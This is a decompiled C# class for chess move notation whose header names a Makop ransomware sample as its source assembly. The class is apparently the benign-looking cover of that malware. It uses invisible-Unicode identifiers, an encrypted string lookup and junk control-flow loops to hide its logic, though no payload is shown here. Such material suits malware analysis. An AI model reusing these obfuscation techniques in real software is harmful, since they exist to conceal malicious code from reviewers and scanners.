// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.Notation
// Assembly: طv, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8DDF840D-AD0E-4D2F-A03C-7E334C2C97A3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-2abb16d594f4b36fc8b8aab8cab7736350421c619cec8e12e8975e87f7a99faa.exe

using System.Runtime.InteropServices;

namespace SimpleChessApp.Game
{
  public class Notation
  {
    public Square from;
    public Square to;

    public string Move
    {
      get
      {
        string move = Notation.\u200F⁭‍‮⁪‌⁪​‭‭‫‫‪‍‍⁮​⁫‎⁪⁫⁭⁭‏⁯‏⁪​‍‌⁮⁭‪‮‮⁯⁪​‭⁮‮(this.from.CurrentSquare, \u003CModule\u003E.\u200F‮​⁫‍⁬⁪‪‏‍⁯⁫⁪⁭⁬‮‍‫‭⁫‮‬‭⁮‮‭⁪⁫⁫‭⁮⁬⁭⁪⁪‌‫‭‍⁭‮<string>(2689744062U), this.to.CurrentSquare);
label_1:
        int num1 = -1780736635;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -562325086)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              num1 = (int) num2 * 1010120311 ^ -1896441598;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return move;
      }
    }

    public Notation(Square f, Square t, Board bo)
    {
      Square square1 = new Square(f.File, f.Rank, bo);
      Square square2 = new Square(t.File, t.Rank, bo);
      square1.Piece = new ChessPiece(f, t.Piece.Kind, t.Piece.Color);
      square2.Piece = new ChessPiece(t, t.Piece.Kind, t.Piece.Color);
      this.from = square1;
      this.to = square2;
    }

    public override string ToString() => this.Move;

    static string \u200F⁭‍‮⁪‌⁪​‭‭‫‫‪‍‍⁮​⁫‎⁪⁫⁭⁭‏⁯‏⁪​‍‌⁮⁭‪‮‮⁯⁪​‭⁮‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }
  }
}
